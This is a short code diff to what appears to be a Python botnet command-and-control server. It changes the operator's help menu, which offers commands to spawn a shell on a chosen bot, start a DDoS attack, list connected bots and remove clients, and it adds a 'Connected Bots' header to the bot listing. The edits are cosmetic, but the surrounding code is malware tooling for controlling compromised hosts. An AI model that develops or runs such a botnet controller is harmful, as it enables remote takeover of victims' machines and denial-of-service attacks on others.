@@ -128,9 +128,10 @@ def send_messages():
             remove_client(selected_client)
 
         elif message_to_send == "help":
-            print("""Commands:\n\n1) shell  - Allows you to select which client you want a shell on\n2) attack - Starts DDoS attack\n3) list   - Shows the list of bots connected\n4) remove - Remove client/s\n5) quit   - Quit DDoS attack\n""")
+            print("""Commands:\n\n1) shell  - Spawn a shell on a selected bot\n2) attack - Starts DDoS attack\n3) list   - Shows the list of bots connected\n4) remove - Remove client/s\n5) quit   - Quit DDoS attack\n""")
 
         elif message_to_send == "list":
+            print("Connected Bots:\n")
             for idx, client_socket in enumerate(connected_clients, 1):
                 client_address = client_socket.getpeername()[0]
                 print(f"{idx}. {client_address}")
